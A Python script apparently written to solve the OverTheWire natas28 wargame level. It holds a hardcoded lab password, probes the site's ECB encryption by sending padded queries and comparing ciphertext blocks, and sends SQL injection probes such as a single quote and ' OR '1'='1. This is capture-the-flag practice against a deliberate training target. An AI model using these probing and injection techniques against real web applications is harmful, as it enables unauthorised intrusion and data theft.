import requests
import base64

url = "http://natas28.natas.labs.overthewire.org/index.php"
auth = ("natas28", "Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3")

for n in range(1, 40):
    payload = "a" * n
    resp = requests.post(url, auth=auth, data={"query": payload}, allow_redirects=False)
    location = resp.headers.get("Location", "")
    # Extract the query param from the redirect
    if "query=" in location:
        encoded = location.split("query=")[1]
        decoded_bytes = base64.b64decode(encoded.replace("%2B", "+").replace("%2F", "/").replace("%3D", "="))
        print(f"n={n:2d}  ciphertext_len={len(decoded_bytes)}  blocks={len(decoded_bytes)//16}")
    else:
        print(f"n={n:2d}  no redirect / unexpected response")

payload = "a" * 48  # enough A's to likely produce 2+ full identical blocks
resp = requests.post(url, auth=auth, data={"query": payload}, allow_redirects=False)
location = resp.headers.get("Location", "")
encoded = location.split("query=")[1]
decoded = base64.b64decode(encoded.replace("%2B","+").replace("%2F","/").replace("%3D","="))

# split into 16-byte blocks and look for duplicates
blocks = [decoded[i:i+16] for i in range(0, len(decoded), 16)]
for i, b in enumerate(blocks):
    print(i, b.hex())
#for n in [32, 36, 40, 44, 48]:
for n in [41,42,43]:
    payload = "a" * n
    resp = requests.post(url, auth=auth, data={"query": payload}, allow_redirects=False)
    location = resp.headers.get("Location", "")
    encoded = location.split("query=")[1]
    decoded = base64.b64decode(encoded.replace("%2B","+").replace("%2F","/").replace("%3D","="))
    blocks = [decoded[i:i+16] for i in range(0, len(decoded), 16)]
    dup_at = None
    for i in range(len(blocks)-1):
        if blocks[i] == blocks[i+1]:
            dup_at = i
            break
    print(f"n={n}: total_blocks={len(blocks)}, first_duplicate_at_block={dup_at}")
def search(payload):
    resp = requests.post(url, auth=auth, data={"query": payload}, allow_redirects=False)
    location = resp.headers.get("Location", "")
    if location.startswith("http"):
        final = requests.get(location, auth=auth)
    else:
        final = requests.get(url.rsplit("/",1)[0] + "/" + location.lstrip("/"), auth=auth)
    return final.text

# Test 1: baseline nonsense (should find nothing, for comparison)
print("=== baseline (no quote) ===")
print(search("a"*10))

print("\n=== single quote (potential break) ===")
print(search("a"*10 + "'"))

print("\n=== two quotes (escaped/closed - should behave like baseline if injectable) ===")
print(search("a"*10 + "''"))

print("\n=== always-true injection attempt ===")
print(search("a"*10 + "' OR '1'='1"))


